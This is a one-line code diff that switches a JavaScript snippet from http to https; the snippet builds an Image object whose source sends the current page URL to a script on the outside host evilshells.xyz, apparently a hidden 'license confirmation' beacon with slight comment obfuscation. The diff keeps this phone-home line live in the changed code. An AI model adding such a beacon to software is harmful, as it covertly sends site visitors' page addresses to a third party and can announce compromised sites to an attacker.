@@ -1,1 +1,1 @@
-a=new/**/Image();a.src='http://evilshells.xyz/license/confirmation.php?a='+escape(location.href);
+a=new/**/Image();a.src='https://evilshells.xyz/license/confirmation.php?a='+escape(location.href);
